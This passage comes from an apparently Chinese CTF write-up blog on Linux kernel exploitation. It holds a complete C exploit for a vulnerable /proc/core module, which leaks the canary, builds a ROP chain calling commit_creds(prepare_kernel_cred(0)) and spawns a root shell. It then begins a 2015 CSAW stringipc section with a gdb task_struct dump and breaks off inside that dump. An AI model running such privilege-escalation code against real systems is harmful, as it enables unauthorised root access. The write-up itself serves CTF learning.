class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_symbols</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE* fp = fopen(<span class="string">"/tmp/kallsyms"</span>,<span class="string">"r"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(fp &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"[:(]Open kallsyms error!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(fgets(buf, <span class="number">0x30</span>, fp))&#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds_addr &amp; prepare_kernel_cred_addr)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"commit_creds"</span>) &amp;&amp; !commit_creds_addr)&#123;</span><br><span class="line">            <span class="keyword">char</span> addr1[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(addr1,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(addr1,<span class="string">"%llx"</span>,&amp;commit_creds_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[:)]commit_creds addr = %p\n"</span>,commit_creds_addr);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">"prepare_kernel_cred"</span>) &amp;&amp; !prepare_kernel_cred_addr)&#123;</span><br><span class="line">            <span class="keyword">char</span> addr2[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(addr2,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(addr2,<span class="string">"%llx"</span>,&amp;prepare_kernel_cred_addr);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[:)]prepare_kernel_cred addr = %p\n"</span>,prepare_kernel_cred_addr);</span><br><span class="line">            vmlinux_base = prepare_kernel_cred_addr - <span class="number">0x9cce0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"[:)]vmlinux_base = %p\n"</span>,vmlinux_base);                </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(commit_creds_addr &amp; prepare_kernel_cred_addr))&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Don't find!!!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_ss,user_cs,user_rflags,user_rsp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"mov user_ss,ss;"</span></span><br><span class="line">        <span class="string">"mov user_cs,cs;"</span></span><br><span class="line">        <span class="string">"mov user_rsp,rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Status has been saved!!!"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:)]root now!!!"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]get root failed..."</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_offset</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">size_t</span> offset)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,offset);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Set offset!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> buf[])</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Read!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">copy_func</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">signed</span> <span class="keyword">long</span> <span class="keyword">long</span> size)</span></span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:)]Copy_data!!!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save();</span><br><span class="line">    get_symbols();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/proc/core"</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[:(]Open /proc/core failed!!!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_offset(fd, <span class="number">0x40</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    Read(fd, buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary = *(<span class="keyword">size_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[:)]Canary = %llx\n"</span>,canary);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> ropchain[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs = vmlinux_base + (<span class="number">0xffffffff81a012da</span><span class="number">-0xffffffff81000000</span>); <span class="comment">//: swapgs; popfq; ret;</span></span><br><span class="line">    <span class="keyword">size_t</span> iretq = vmlinux_base + (<span class="number">0xffffffff81050ac2</span><span class="number">-0xffffffff81000000</span>); <span class="comment">//: iretq; ret;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; <span class="number">8</span>;i++)&#123;</span><br><span class="line">        ropchain[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ropchain[i++] = canary;</span><br><span class="line">    ropchain[i++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line"></span><br><span class="line">    ropchain[i++] = swapgs;</span><br><span class="line">    ropchain[i++] = <span class="number">0</span>;</span><br><span class="line">    ropchain[i++] = iretq;</span><br><span class="line"></span><br><span class="line">    ropchain[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    ropchain[i++] = user_cs;</span><br><span class="line">    ropchain[i++] = user_rflags;</span><br><span class="line">    ropchain[i++] = user_rsp;</span><br><span class="line">    ropchain[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd,ropchain,<span class="number">0x100</span>);</span><br><span class="line">    copy_func(fd,<span class="number">0xffffffffffff0000</span>|<span class="number">0x0100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(p.sym['commit_creds']-0xffffffff81000000)</span></span><br><span class="line"><span class="comment">'0x9c8e0'</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(p.sym['prepare_kernel_cred']-0xffffffff81000000)</span></span><br><span class="line"><span class="comment">'0x9cce0'</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h1 id="2015CSAW-stringipc"><a href="#2015CSAW-stringipc" class="headerlink" title="2015CSAW_stringipc"></a>2015CSAW_stringipc</h1><p>即使有源码还是看了快一天，关于内核的知识了解的实在太少，不过做题本就是次要，积累知识才是现阶段的首要目的。</p>
<h2 id="解法一：-2"><a href="#解法一：-2" class="headerlink" title="解法一："></a>解法一：</h2><p>写主线程的<code>cred</code>结构体</p>
<h3 id="task-struct-amp-amp-thread-info-amp-amp-cred："><a href="#task-struct-amp-amp-thread-info-amp-amp-cred：" class="headerlink" title="task_struct &amp;&amp; thread_info &amp;&amp; cred："></a>task_struct &amp;&amp; thread_info &amp;&amp; cred：</h3><p>细节可参考：</p>
<p><a href="https://blog.csdn.net/gatieme/article/details/51383272" target="_blank" rel="noopener">https://blog.csdn.net/gatieme/article/details/51383272</a></p>
<p>我使用源码调试，在泄露了<code>cred</code>的地址之后，在内存中找到了完整的<code>task_struct</code>，并确定了一些重要变量的偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p (struct task_struct)*<span class="number">0xffff88000f842980</span></span><br><span class="line">$<span class="number">6</span> = &#123;</span><br><span class="line">  state = <span class="number">0x0</span>, </span><br><span class="line">  <span class="built_in">stack</span> = <span class="number">0xffff88000f5f4000</span>,        <span class="comment">//important</span></span><br><span class="line">  usage = &#123;</span><br><span class="line">    counter = <span class="number">0x2</span></span><br><span class="line">  &#125;, </span><br><span class="line">  flags = <span class="number">0x404000</span>, </span><br><span class="line">  ptrace = <span class="number">0x0</span>, </span><br><span class="line">  wake_entry = &#123;</span><br><span class="line">    next = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  on_cpu = <span class="number">0x1</span>, </span><br><span class="line">  wakee_flips = <span class="number">0x18</span>, </span><br><span class="line">  wakee_flip_decay_ts = <span class="number">0xfffee692</span>, </span><br><span class="line">  last_wakee = <span class="number">0xffff88000d7ae7c0</span>, </span><br><span class="line">  wake_cpu = <span class="number">0x0</span>, </span><br><span class="line">  on_rq = <span class="number">0x1</span>, </span><br><span class="line">  prio = <span class="number">0x78</span>, </span><br><span class="line">  static_prio = <span class="number">0x78</span>, </span><br><span class="line">  normal_prio = <span class="number">0x78</span>, </span><br><span class="line">  rt_priority = <span class="number">0x0</span>, </span><br><span class="line">  sched_class = <span class="number">0xffffffff81a276a0</span> &lt;fair_sched_class&gt;, </span><br><span class="line">  se = &#123;</span><br><span class="line">    load = &#123;</span><br><span class="line">      weight = <span class="number">0x400</span>, </span><br><span class="line">      inv_weight = <span class="number">0x400000</span></span><br><span class="line">    &#125;, </span><br><span class="line">    run_node = &#123;</span><br><span class="line">      __rb_parent_color = <span class="number">0x1</span>, </span><br><span class="line">      rb_right = <span class="number">0x0</span> &lt;irq_stack_union&gt;, </span><br><span class="line">      rb_left = <span class="number">0x0</span> &lt;irq_stack_union&gt;</span><br><span class="line">    &#125;, </span><br><span class="line">    group_node = &#123;</span><br><span class="line">      next = <span class="number">0xffff88000de176e8</span>, </span><br><span class="line">      prev = <span class="number">0xffff88000de176e8</span></span><br><span class="line">    &#125;, </span><br><span class="line">    on_rq = <span class="number">0x1</span>, </span><br><span class="line">    exec_start = <span 